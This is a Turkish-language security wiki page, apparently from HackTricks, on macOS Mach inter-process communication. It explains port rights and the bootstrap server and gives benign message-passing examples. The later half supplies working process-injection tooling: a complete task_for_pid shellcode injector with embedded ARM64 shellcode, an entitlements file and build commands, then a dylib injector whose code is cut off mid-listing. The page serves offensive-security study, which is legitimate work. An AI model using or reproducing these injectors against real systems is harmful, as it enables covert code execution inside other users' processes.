# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach mesajlaşması üzerinden Portlar

### Temel Bilgiler

Mach, kaynakları paylaşmak için **en küçük birim** olarak **görevleri** kullanır ve her görev **birden fazla iş parçacığı** içerebilir. Bu **görevler ve iş parçacıkları, POSIX süreçleri ve iş parçacıkları ile 1:1 eşlenir**.

Görevler arasındaki iletişim, tek yönlü iletişim kanallarını kullanarak Mach Araçlar Arası İletişim (IPC) aracılığıyla gerçekleşir. **Mesajlar, çekirdek tarafından yönetilen **mesaj kuyrukları** gibi davranan portlar arasında aktarılır.

Her sürecin bir **IPC tablosu** vardır; burada **sürecin mach portlarını** bulmak mümkündür. Bir mach portunun adı aslında bir sayıdır (çekirdek nesnesine bir işaretçi).

Bir süreç ayrıca bazı haklarla birlikte bir port adını **farklı bir göreve** gönderebilir ve çekirdek, bu girişi **diğer görevin IPC tablosunda** görünür hale getirecektir.

### Port Hakları

Bir görevin gerçekleştirebileceği işlemleri tanımlayan port hakları, bu iletişim için anahtardır. Olası **port hakları** şunlardır ([tanımlar buradan](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Alma hakkı**, portta gönderilen mesajları alma izni verir. Mach portları MPSC (çoklu üretici, tek tüketici) kuyruklarıdır, bu da sistemde her port için yalnızca **bir alma hakkı** olabileceği anlamına gelir (bir boru ile, birden fazla süreç bir borunun okuma ucuna dosya tanımlayıcıları tutabilir).
- **Alma** hakkına sahip bir **görev**, mesaj alabilir ve **Gönderme hakları** oluşturabilir, böylece mesaj gönderebilir. Başlangıçta yalnızca **kendi görevi, portu üzerinde Alma hakkına** sahiptir.
- **Gönderme hakkı**, portta mesaj göndermeye izin verir.
- Gönderme hakkı **kopyalanabilir**, böylece bir Gönderme hakkına sahip bir görev, hakkı kopyalayabilir ve **üçüncü bir göreve verebilir**.
- **Bir kez gönderme hakkı**, portta bir mesaj göndermeye izin verir ve ardından kaybolur.
- **Port set hakkı**, tek bir port yerine bir _port setini_ belirtir. Bir port setinden bir mesajın çıkarılması, içerdiği portlardan birinden bir mesajın çıkarılması anlamına gelir. Port setleri, Unix'teki `select`/`poll`/`epoll`/`kqueue` gibi birden fazla portta aynı anda dinlemek için kullanılabilir.
- **Ölü ad**, gerçek bir port hakkı değildir, sadece bir yer tutucudur. Bir port yok edildiğinde, port üzerindeki tüm mevcut port hakları ölü adlara dönüşür.

**Görevler, diğerlerine GÖNDERME haklarını aktarabilir**, böylece geri mesaj gönderebilirler. **GÖNDERME hakları da kopyalanabilir, böylece bir görev, hakkı çoğaltabilir ve üçüncü bir göreve verebilir**. Bu, **bootstrap sunucusu** olarak bilinen bir ara süreçle birleştirildiğinde, görevler arasında etkili iletişim sağlar.

### Dosya Portları

Dosya portları, Mac portlarında dosya tanımlayıcılarını kapsüllemeye olanak tanır (Mach port haklarını kullanarak). Verilen bir FD'den `fileport_makeport` kullanarak bir `fileport` oluşturmak ve bir fileport'tan `fileport_makefd` kullanarak bir FD oluşturmak mümkündür.

### İletişim Kurma

#### Adımlar:

İletişim kanalını kurmak için, **bootstrap sunucusu** (**launchd** mac'te) devreye girer.

1. Görev **A**, bir **yeni port** başlatır ve süreçte bir **ALMA hakkı** elde eder.
2. Görev **A**, ALMA hakkının sahibi olarak, **port için bir GÖNDERME hakkı oluşturur**.
3. Görev **A**, **portun hizmet adını** ve **GÖNDERME hakkını** sağlayarak **bootstrap sunucusu** ile bir **bağlantı** kurar.
4. Görev **B**, hizmet adı için bir bootstrap **arama** gerçekleştirmek üzere **bootstrap sunucusu** ile etkileşime girer. Başarılı olursa, **sunucu, Görev A'dan aldığı GÖNDERME hakkını kopyalar** ve **Görev B'ye iletir**.
5. GÖNDERME hakkını aldıktan sonra, Görev **B**, bir **mesaj** oluşturma ve bunu **Görev A'ya** gönderme yeteneğine sahiptir.
6. İki yönlü iletişim için genellikle görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı ile yeni bir port oluşturur ve **GÖNDERME hakkını Görev A'ya** verir, böylece Görev B'ye mesaj gönderebilir (iki yönlü iletişim).

Bootstrap sunucusu, bir görevin iddia ettiği hizmet adını **doğrulayamaz**. Bu, bir **görevin** potansiyel olarak **herhangi bir sistem görevini taklit edebileceği** anlamına gelir; örneğin, yanlış bir şekilde **bir yetkilendirme hizmet adı iddia edebilir** ve ardından her isteği onaylayabilir.

Daha sonra, Apple, **sistem tarafından sağlanan hizmetlerin adlarını** güvenli yapılandırma dosyalarında saklar; bu dosyalar **SIP-korunan** dizinlerde bulunur: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her hizmet adıyla birlikte, **ilişkili ikili dosya da saklanır**. Bootstrap sunucusu, bu hizmet adlarının her biri için bir **ALMA hakkı** oluşturacak ve tutacaktır.

Bu önceden tanımlanmış hizmetler için, **arama süreci biraz farklıdır**. Bir hizmet adı arandığında, launchd hizmeti dinamik olarak başlatır. Yeni iş akışı şu şekildedir:

- Görev **B**, bir hizmet adı için bootstrap **arama** başlatır.
- **launchd**, görevin çalışıp çalışmadığını kontrol eder ve çalışmıyorsa, **başlatır**.
- Görev **A** (hizmet), bir **bootstrap kontrolü** gerçekleştirir. Burada, **bootstrap** sunucusu bir GÖNDERME hakkı oluşturur, bunu saklar ve **ALMA hakkını Görev A'ya aktarır**.
- launchd, **GÖNDERME hakkını kopyalar ve Görev B'ye gönderir**.
- Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı ile yeni bir port oluşturur ve **GÖNDERME hakkını Görev A'ya** (hizmet) verir, böylece Görev B'ye mesaj gönderebilir (iki yönlü iletişim).

Ancak, bu süreç yalnızca önceden tanımlanmış sistem görevleri için geçerlidir. Sistem dışı görevler, başlangıçta tanımlandığı gibi çalışmaya devam eder, bu da taklit olasılığını artırabilir.

### Bir Mach Mesajı

[Buradan daha fazla bilgi edinin](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` fonksiyonu, esasen bir sistem çağrısıdır ve Mach mesajlarını göndermek ve almak için kullanılır. Fonksiyon, gönderilecek mesajı ilk argüman olarak gerektirir. Bu mesaj, `mach_msg_header_t` yapısı ile başlamalı ve ardından gerçek mesaj içeriği gelmelidir. Yapı şu şekilde tanımlanmıştır:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
İşlemler, bir _**alma hakkı**_ bulunduruyorsa, bir Mach portu üzerinde mesaj alabilirler. Tersine, **gönderenler** bir _**gönderme**_ veya _**bir kez gönderme hakkı**_ alırlar. Bir kez gönderme hakkı, yalnızca tek bir mesaj göndermek için geçerlidir, ardından geçersiz hale gelir.

Kolay bir **iki yönlü iletişim** sağlamak için bir işlem, mesajın **yanıt portu** olarak adlandırılan **mach portunu** mach **mesaj başlığında** belirtebilir (**`msgh_local_port`**) ve mesajın **alıcı**sı bu mesaja **bir yanıt gönderebilir**. **`msgh_bits`** içindeki bit bayrakları, bu port için bir **bir kez gönderme** **hakkı** türetilmesi ve aktarılması gerektiğini **belirtmek** için kullanılabilir (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Bu tür bir iki yönlü iletişimin, bir yanıt bekleyen XPC mesajlarında kullanıldığını unutmayın (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`). Ancak **genellikle farklı portlar oluşturulur**; daha önce açıklandığı gibi iki yönlü iletişim oluşturmak için.

Mesaj başlığının diğer alanları şunlardır:

- `msgh_size`: tüm paketin boyutu.
- `msgh_remote_port`: bu mesajın gönderildiği port.
- `msgh_voucher_port`: [mach kuponları](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: bu mesajın alıcı tarafından yorumlanan kimliği.

> [!CAUTION]
> **mach mesajlarının bir \_mach portu** üzerinden gönderildiğini unutmayın, bu, mach çekirdeğine entegre edilmiş **tek alıcı**, **birden fazla gönderici** iletişim kanalıdır. **Birden fazla işlem**, bir mach portuna **mesaj gönderebilir**, ancak herhangi bir anda yalnızca **tek bir işlem okuyabilir**. 

### Portları Sayma
```bash
lsmp -p <pid>
```
Bu aracı iOS'ta [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) adresinden indirerek kurabilirsiniz.

### Kod örneği

**Gönderenin** bir port **ayırdığını**, `org.darlinghq.example` adı için bir **gönderim hakkı** oluşturduğunu ve bunu **bootstrap sunucusuna** gönderdiğini, gönderenin o adın **gönderim hakkını** talep ettiğini ve bunu **bir mesaj göndermek** için kullandığını not edin.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Ayrıcalıklı Portlar

- **Host port**: Eğer bir süreç bu port üzerinde **Send** ayrıcalığına sahipse, **sistem** hakkında **bilgi** alabilir (örneğin, `host_processor_info`).
- **Host priv port**: Bu port üzerinde **Send** hakkına sahip bir süreç, bir çekirdek uzantısını yüklemek gibi **ayrıcalıklı işlemler** gerçekleştirebilir. Bu izni almak için **süper kullanıcı** olması gerekir.
- Ayrıca, **`kext_request`** API'sini çağırmak için yalnızca Apple ikili dosyalarına verilen diğer yetkilere **`com.apple.private.kext*`** sahip olmak gereklidir.
- **Task name port:** _task port_'un ayrıcalıksız bir versiyonudur. Görevi referans alır, ancak onu kontrol etmeye izin vermez. Bunun üzerinden erişilebilen tek şey `task_info()` gibi görünmektedir.
- **Task port** (diğer adıyla kernel port)**:** Bu port üzerinde Send izni ile görevi kontrol etmek mümkündür (belleği okuma/yazma, iş parçacıkları oluşturma...).
- Çağrıcı görev için bu portun **adını almak** için `mach_task_self()` çağrısını yapın. Bu port yalnızca **`exec()`** üzerinden **devralınır**; `fork()` ile oluşturulan yeni bir görev yeni bir görev portu alır (özel bir durum olarak, bir görev `exec()` sonrası bir suid ikili dosyasında da yeni bir görev portu alır). Bir görevi başlatmanın ve portunu almanın tek yolu, `fork()` yaparken ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) gerçekleştirmektir.
- Port erişimi için kısıtlamalar (ikili dosya `AppleMobileFileIntegrity`'den `macos_task_policy`):
- Uygulama **`com.apple.security.get-task-allow` yetkisine** sahipse, **aynı kullanıcıdan** gelen süreçler görev portuna erişebilir (genellikle hata ayıklama için Xcode tarafından eklenir). **Notarizasyon** süreci bunu üretim sürümlerine izin vermez.
- **`com.apple.system-task-ports`** yetkisine sahip uygulamalar, çekirdek hariç, **herhangi bir** sürecin görev portunu alabilir. Eski sürümlerde buna **`task_for_pid-allow`** denirdi. Bu yalnızca Apple uygulamalarına verilir.
- **Root,** **hardened** çalışma zamanı ile derlenmemiş uygulamaların görev portlarına erişebilir (ve Apple'dan olmayan). 

### Görev portu aracılığıyla iş parçacığında Shellcode Enjeksiyonu

Bir shellcode'u şuradan alabilirsiniz:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Önceki** programı derleyin ve aynı kullanıcı ile kod enjekte edebilmek için **yetkilendirmeleri** ekleyin (aksi takdirde **sudo** kullanmanız gerekecek).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Enjeksiyonu iş parçacığında Görev portu aracılığıyla

macOS'ta **iş parçacıkları** **Mach** veya **posix `pthread` api** kullanılarak manipüle edilebilir. Önceki enjeksiyonda oluşturduğumuz iş parçacığı, Mach api kullanılarak oluşturuldu, bu nedenle **posix uyumlu değildir**.

Bir komut çalıştırmak için **basit bir shellcode** enjekte etmek mümkündü çünkü **posix** uyumlu apilerle çalışması gerekmiyordu, sadece Mach ile. **Daha karmaşık enjeksiyonlar** için **iş parçacığının** da **posix uyumlu** olması gerekecektir.

Bu nedenle, **iş parçacığını geliştirmek** için **`pthread_create_from_mach_thread`** çağrılmalıdır; bu, **geçerli bir pthread** oluşturacaktır. Ardından, bu yeni pthread **dlopen** çağrısı yaparak sistemden **bir dylib** yükleyebilir, böylece farklı eylemleri gerçekleştirmek için yeni shellcode yazmak yerine özel kütüphaneler yüklemek mümkündür.

**Örnek dylib'leri** (örneğin bir günlük oluşturan ve ardından dinleyebileceğiniz) bulabilirsiniz:

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
